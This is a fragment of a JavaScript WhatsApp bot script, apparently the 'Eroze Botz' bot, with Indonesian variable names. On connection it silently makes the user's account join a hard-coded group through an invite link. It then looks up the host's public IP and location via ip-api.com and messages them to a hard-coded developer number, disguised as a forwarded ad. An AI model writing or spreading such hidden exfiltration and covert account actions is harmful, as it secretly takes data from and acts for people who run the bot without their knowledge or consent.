...
pemuda.autoReconnect = ReconnectMode.onConnectionLost
 ...
 teks = `https://chat.whatsapp.com/LNSLUbCXb7S6mGFBFITY76`
 pemuda.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Bergabung ke Grup Official Eroze Botz', 'cyan'))
...
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       pemuda.sendMessage("628985397156@s.whatsapp.net", `─────「 *IP USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Eroze Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:"https://wa.me/6282252509320?text=Assalamualaikum"}}})
